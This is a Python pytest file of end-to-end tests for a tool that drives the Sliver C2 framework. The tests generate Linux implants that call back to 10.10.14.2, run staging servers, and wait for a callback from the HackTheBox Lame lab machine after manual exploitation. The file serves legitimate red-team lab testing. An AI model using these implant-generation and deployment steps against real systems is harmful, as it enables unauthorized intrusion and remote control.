"""E2E test for Sliver implant deployment workflow."""

import asyncio
from pathlib import Path

import pytest
from rich.console import Console
from wish_c2.models import ImplantConfig


@pytest.mark.asyncio
class TestSliverImplantDeployment:
    """Test complete Sliver implant deployment workflow."""

    console = Console()

    async def test_implant_generation_workflow(self, real_c2_connector):
        """Test implant generation through wish."""
        # Skip if not connected
        if not await real_c2_connector.is_connected():
            pytest.skip("Sliver C2 not connected")

        # Generate implant
        config = ImplantConfig(
            name="TEST_IMPLANT",
            os="linux",
            arch="amd64",
            format="exe",
            protocol="https",
            callback_host="10.10.14.2",
            callback_port=443,
        )

        implant_info = await real_c2_connector.generate_implant(config)

        assert implant_info is not None
        assert implant_info.name == "TEST_IMPLANT"
        assert Path(implant_info.file_path).exists()
        assert implant_info.size > 0
        assert len(implant_info.hash_sha256) == 64  # SHA256 hash length

        # Cleanup
        await real_c2_connector.delete_implant(implant_info.id)

    async def test_staging_server_lifecycle(self, real_c2_connector):
        """Test staging server start/stop."""
        if not await real_c2_connector.is_connected():
            pytest.skip("Sliver C2 not connected")

        # Start staging server
        server = await real_c2_connector.start_staging_server(port=8081)

        assert server is not None
        assert server.port == 8081
        assert server.status == "running"

        # List servers
        servers = await real_c2_connector.list_staging_servers()
        assert any(s.id == server.id for s in servers)

        # Stop server
        success = await real_c2_connector.stop_staging_server(server.id)
        assert success is True

    async def test_implant_deployment_cli_commands(self, headless_wish, c2_service):
        """Test implant deployment through CLI commands."""
        # Start headless wish
        wish = await anext(headless_wish)

        # Generate implant
        await wish.execute_command("/sliver generate --host 10.10.14.2 --name CLI_TEST")
        output = wish.get_output()
        assert "Generated implant: CLI_TEST" in output

        # Start staging server
        await wish.execute_command("/sliver staging start 8082")
        output = wish.get_output()
        assert "Staging server started" in output
        assert "8082" in output

        # List staging servers
        await wish.execute_command("/sliver staging list")
        output = wish.get_output()
        assert "Active Staging Servers" in output
        assert "8082" in output

        # Stop staging server
        server_output = wish.get_output()
        # Extract server ID from output (first 8 chars of ID shown)
        import re
        match = re.search(r"Server ID: ([a-f0-9]{8})", server_output)
        if match:
            server_id = match.group(1)
            await wish.execute_command(f"/sliver staging stop {server_id}")
            output = wish.get_output()
            assert "Stopped staging server" in output

    @pytest.mark.htb
    async def test_htb_lame_implant_workflow(self, headless_wish, c2_service):
        """Test complete HTB Lame implant deployment workflow."""
        # Skip if HTB environment not available
        import subprocess
        result = subprocess.run(["ping", "-c", "1", "-W", "1", "10.10.10.3"],
                              capture_output=True)
        if result.returncode != 0:
            pytest.skip("HTB Lame (10.10.10.3) not reachable")

        wish = await anext(headless_wish)

        # Generate implant for HTB Lame
        await wish.execute_command(
            "/sliver generate --host 10.10.14.2 --name HTB_LAME_TEST --os linux"
        )
        output = wish.get_output()
        assert "Generated implant: HTB_LAME_TEST" in output

        # Start staging server
        await wish.execute_command("/sliver staging start 8080")
        output = wish.get_output()
        assert "Staging server started" in output

        # Get current sessions before exploit
        await wish.execute_command("/sliver implants")
        before_output = wish.get_output()

        # Simulate exploitation (would need actual exploit in real test)
        self.console.print("[yellow]Manual exploitation required at this point[/yellow]")
        self.console.print("Use Metasploit or manual SMB exploitation")

        # Wait for callback (with timeout)
        new_session_found = False
        for _ in range(12):  # 60 seconds total
            await asyncio.sleep(5)
            await wish.execute_command("/sliver implants")
            after_output = wish.get_output()

            # Check if new session appeared
            if "HTB_LAME_TEST" in after_output and "HTB_LAME_TEST" not in before_output:
                new_session_found = True
                break

        # Note: In automated testing, we might not get a real callback
        # This test primarily validates the workflow is correct
